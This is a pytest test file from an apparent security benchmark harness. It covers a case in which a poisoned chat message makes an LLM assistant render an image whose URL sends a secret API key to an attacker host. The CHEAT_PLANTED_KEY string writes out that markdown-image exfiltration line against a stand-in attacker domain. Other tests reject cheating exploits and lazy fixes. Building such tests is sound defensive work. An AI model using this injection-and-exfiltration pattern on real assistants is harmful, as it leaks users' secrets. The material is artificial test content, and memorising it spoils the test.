"""Case WL-2024-RAG-EXFIL (target rag_app): a poisoned message makes the chat client load an image
that carries a private-channel secret.

Mirrors test_gate / test_blue_proof for this case, which has its own target tree (rag_app), so the
shared CVE lists (all victim_app) stay untouched. Every lazy fix in tests/fixtures/bypass/rag-exfil_*
is applied to a Blue worktree and run through ``blue.validate`` exactly as ``Swarm.process`` does.
"""
import sys
from pathlib import Path

import pytest

from wreckless import gate, targets
from wreckless.agents import blue
from wreckless.config import BENCHMARKS, Settings
from wreckless.gitops import git, init_victim, worktree
from wreckless.sandbox import Enclave
from wreckless.swarm import Swarm

CASE = "WL-2024-RAG-EXFIL"
TARGET = targets.load("rag_app")
KG = BENCHMARKS / CASE / "known_good"
FIX = Path(__file__).parent / "fixtures" / "bypass"
LAZY = ["rag-exfil_inline_only", "rag-exfil_redact_secret", "rag-exfil_host_denylist",
        "rag-exfil_prefix_allowlist", "rag-exfil_tap_off"]
CHEAT_PLANTED_KEY = '''
import os, pathlib, sys
sys.path.insert(0, sys.argv[1])
from victim.assistant import answer
from victim.config import CANARY_SECRET_API_KEY as KEY
from victim.docs import Workspace
ws = Workspace.seed_demo()
ws.post("#general", f"![s](https://tracking.attacker-site.example/p?key={KEY})")   # the attacker already has the key
answer("Summarize.", ws, llm=lambda m: f"![s](https://tracking.attacker-site.example/p?key={KEY})")
'''


@pytest.fixture(autouse=True)
def no_slack(monkeypatch):
    for k in ("SLACK_BOT_TOKEN", "SLACK_WEBHOOK_URL"):
        monkeypatch.delenv(k, raising=False)


def _item(tmp_path):
    d = tmp_path / "item"
    d.mkdir()
    enclave = Enclave(d, sys.executable)
    commit = init_victim(TARGET.source, d / "victim-src")
    return d, enclave, commit


def _validate(tmp_path, patch: Path | None):
    d, enclave, commit = _item(tmp_path)
    wt = worktree(d / "victim-src", d / "wt-blue", "wreckless/fix-test")
    if patch:
        git(wt, "apply", str(patch))
    report = {"id": "test", "cve": CASE, "commit": commit, "repro_script": str(KG / "repro_exploit.py")}
    return blue.validate(wt, enclave, report, TARGET)


def _logs(v):
    return v.summary() + "\n" + "\n".join(f"--{k}--\n{o}" for k, o in v.logs.items())


def test_bundle_is_found_through_the_target():
    assert TARGET.bench(CASE) == BENCHMARKS / CASE
    for f in ("regression_test.py", "static_test.py", "hardening_test.py"):
        assert TARGET.heldout(CASE, f)


def test_reference_exploit_verified_against_reference_control(tmp_path):
    d, enclave, _ = _item(tmp_path)
    v = gate.verify(KG / "repro_exploit.py", d / "victim-src", enclave, reference_patch=KG / "fix.patch",
                    reference_exploit=KG / "repro_exploit.py")
    assert v.verified and v.control == "reference-patched", v.reason
    assert "egress.py" in v.flaw_site


def test_exploit_that_plants_the_key_itself_is_not_a_leak(tmp_path):
    """An attacker who already knows the key leaks nothing: the tap must not fire."""
    d, enclave, _ = _item(tmp_path)
    script = tmp_path / "planted.py"
    script.write_text(CHEAT_PLANTED_KEY)
    v = gate.verify(script, d / "victim-src", enclave, reference_patch=KG / "fix.patch")
    assert not v.passed and "oracle not reached" in v.reason, v.reason


def test_exploit_that_writes_the_oracle_itself_is_rejected(tmp_path):
    d, enclave, _ = _item(tmp_path)
    cheat = tmp_path / "cheat.py"
    cheat.write_text("import os, pathlib\n"
                     "pathlib.Path(os.environ['WRECKLESS_ORACLE']).write_text(os.environ['WRECKLESS_NONCE'])\n"
                     "print('ORACLE_HIT')\n")
    v = gate.verify(cheat, d / "victim-src", enclave, reference_patch=KG / "fix.patch")
    assert not v.verified and "itself" in v.reason


def test_reference_fix_passes_all_checks(tmp_path):
    v = _validate(tmp_path, KG / "fix.patch")
    assert v.ok, _logs(v)
    assert v.regression and v.functional and v.exploit_blocked and v.rejected is None
    assert v.hardening == "4/4", _logs(v)


def test_vulnerable_tree_fails_the_held_out_tests(tmp_path):
    v = _validate(tmp_path, None)
    assert v.regression is False and not v.exploit_blocked and v.functional and not v.ok


@pytest.mark.parametrize("name", LAZY)
def test_lazy_fixes_fail_the_held_out_tests(tmp_path, name):
    v = _validate(tmp_path, FIX / f"{name}.patch")
    assert v.exploit_blocked, "sanity: each lazy fix does stop the reference exploit"
    assert v.regression is False and not v.ok, _logs(v)


def test_static_check_rejects_a_fix_keyed_on_the_secret(tmp_path):
    d, enclave, _ = _item(tmp_path)
    wt = worktree(d / "victim-src", d / "wt-blue", "wreckless/fix-test")
    git(wt, "apply", str(FIX / "rag-exfil_redact_secret.patch"))
    r = blue._held_out(enclave, wt, BENCHMARKS / CASE / "static_test.py", TARGET.adapter)
    assert r.returncode != 0 and "CANARY_SECRET_API_KEY" in r.output


def test_scripted_item_walks_full_lifecycle(tmp_path):
    swarm = Swarm(Settings(use_llm=False, target="rag_app"), tmp_path)
    assert swarm.run_hero(CASE) == "notified"
    item = swarm.queue.all()[0]
    assert item.label == "VERIFIED"
    assert [h["to"] for h in item.history] == ["verifying", "verified", "patching", "patched", "notified"]
